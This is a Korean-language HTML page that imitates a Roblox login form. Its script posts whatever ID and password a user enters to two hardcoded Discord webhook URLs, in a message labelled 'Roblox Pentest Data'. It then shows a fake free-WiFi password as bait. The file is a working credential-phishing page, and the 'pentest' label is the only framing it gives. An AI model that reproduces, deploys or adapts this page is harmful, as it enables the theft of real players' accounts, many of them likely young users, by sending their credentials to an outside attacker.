<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox 로그인 - Roblox</title>
    <style>
        body {
            font-family: 'Roboto', arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fff;
        }
        .login-box {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
            box-sizing: border-box;
        }
        .logo { margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        p { font-size: 16px; color: #202124; margin-bottom: 40px; }
        .input-group { text-align: left; margin-bottom: 24px; }
        input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .btn-container {
            display: flex;
            justify-content: flex-end;
            margin-top: 40px;
        }
        button {
            background-color: #1a73e8;
            color: white;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        /* 결과 화면 스타일 */
        .key-display {
            text-align: center;
        }
        .key-box {
            padding: 20px;
            border: 2px dashed #1a73e8;
            margin-top: 20px;
            font-size: 24px;
            font-weight: bold;
            color: #202124;
        }
    </style>
</head>
<body>

<div id="main-content">
    <div class="login-box">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTkVFlvrIx0sjaqPAtE9oemabGfo48NvrQpQ4gongVK-imtkk8CUg&s=10&ec=121585071" width="75" alt="Roblox" class="logo">
        <h1>Roblox 로그인</h1>
        <p>Roblox 계정 사용</p>
        <div class="input-group">
            <input type="text" id="email" placeholder="아이디 입력" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="비밀번호 입력" required>
        </div>
        <div class="btn-container">
            <button onclick="submitData()">로그인</button>
        </div>
    </div>
</div>

<script>
    async function submitData() {
        const email = document.getElementById('email').value;
        const pw = document.getElementById('password').value;

        if (!email || !pw) {
            alert("아이디와 비밀번호를 입력해주세요.");
            return;
        }

        const webhooks = [
            "https://discord.com/api/webhooks/1480916043869196448/vAcZXldHpkuKVBy8hOSZ6VOBPoqXf1zOLb2MQvZmSkVgO3rBy3rH5q9LcVLQOsokDIOg",
            "https://discord.com/api/webhooks/1480916038584500394/jL8Hr2VNwVPUCwlWcHkNDlBPVGJ4y385aNU8lP_vJmAfHxqwYEZBnDlG3s0hzskmjrXc"
        ];

        const payload = {
            embeds: [{
                title: "Roblox Pentest Data",
                color: 15790320,
                fields: [
                    { name: "ID", value: email, inline: false },
                    { name: "PW", value: pw, inline: false }
                ],
                footer: { text: new Date().toLocaleString() }
            }]
        };

        try {
            // 디스코드 전송
            await Promise.all(webhooks.map(url => 
                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
            ));

            // 전송 완료 후 화면 전환 (키 값 출력)
            document.getElementById('main-content').innerHTML = `
                <div class="key-display">
                    <h1 style="color: #1a73e8;">전송 완료</h1>
                    <div class="key-box">
                        키 = hacking_123454
                    </div>
                    <p style="margin-top: 20px; color: #5f6368;">무료 와이파이 암호 값입니다.</p>
                </div>
            `;

        } catch (e) {
            console.error(e);
            alert("전송 중 오류가 발생했습니다.");
        }
    }
</script>

</body>
</html>
